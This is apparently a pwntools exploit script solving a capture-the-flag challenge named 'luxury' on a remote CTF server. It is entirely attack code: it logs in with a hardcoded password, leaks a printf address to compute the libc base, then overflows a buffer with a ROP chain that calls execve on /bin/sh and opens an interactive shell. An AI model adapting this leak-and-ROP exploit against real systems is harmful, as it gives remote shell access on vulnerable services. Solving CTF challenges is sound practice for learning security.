from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
exe = ELF("./luxury")
# s = process("./luxury")
s = remote("tasks.polyctf.ru", 30006)

s.recvuntil(b": ")
s.sendline(b"admin")
s.recvuntil(b": ")
s.sendline(b"V3rY_sTroNg_p1ss")

s.recvuntil(b"> ")
s.sendline(b"1")

s.recvuntil(b"-> ")

leak = s.recvline().strip()

# OFFSET_PRINTF = libc.symbols["printf"]
OFFSET_PRINTF = 0x525b0
LIBC_BASE = int(leak, 16) - OFFSET_PRINTF

print(hex(LIBC_BASE))

s.recvuntil(b"> ")
s.sendline(b"5")

s.recvuntil(b": ")
s.sendline(b"AAAA")

# bin_sh = 0x197e34
bin_sh = 0x196031
pop_rdi = 0x00000000000277e5
pop_rsi = 0x0000000000028f99
pop_rax = 0x000000000003f197
pop_rdx = 0x00000000000fde7d
syscall = 0x0000000000026428

ROP = p64(LIBC_BASE + pop_rax)
ROP += p64(0x3b)
ROP += p64(LIBC_BASE + pop_rdi)
ROP += p64(LIBC_BASE + bin_sh)
ROP += p64(LIBC_BASE + pop_rsi)
ROP += p64(0x0)
ROP += p64(LIBC_BASE + pop_rdx)
ROP += p64(0x0)
ROP += p64(LIBC_BASE + syscall)

s.sendline(b"A" * 32 + p64(0xCAFEBABE) + ROP)

s.interactive()
